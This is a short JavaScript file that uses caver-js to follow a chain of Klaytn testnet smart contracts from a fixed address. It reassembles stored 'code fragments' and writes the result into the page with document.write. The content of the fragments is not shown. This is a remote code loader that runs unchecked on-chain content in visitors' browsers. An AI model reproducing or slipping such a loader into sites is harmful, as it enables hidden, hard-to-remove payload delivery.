import "@babel/polyfill";
// import $ from './custom_jquery';
import Caver from 'caver-js';
const caver = new Caver('https://api.baobab.klaytn.net:8651/');
console.log('test');

// var selector, type, response,
// self = this,
// off = url.indexOf( " " );


async function klayLoad() {
    // response = arguments;

    const abi = [{"inputs":[{"internalType":"address","name":"_prevContract","type":"address"},{"internalType":"string","name":"_codeFrag","type":"string"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"constant":true,"inputs":[],"name":"getCodeFragment","outputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"}];
    const fragContract = new caver.klay.Contract(abi);

    var curAddress = '0x768A1Af2D3ECbbB614Df77831aa642141B1Fb302';

    let assembled = '';
    while(curAddress !== '0x0000000000000000000000000000000000000000') {
    fragContract.options.address = curAddress;
    const result = await fragContract.methods.getCodeFragment().call({
        from: '',
        gas: 1500000,
        value: 0,
    });
    curAddress = result[0];
    assembled = result[1] + assembled;
        console.log(result);
    }
    const responseText = assembled;
    document.write(responseText)
}

klayLoad();
// $('body').klayLoad('test', caver, () => {});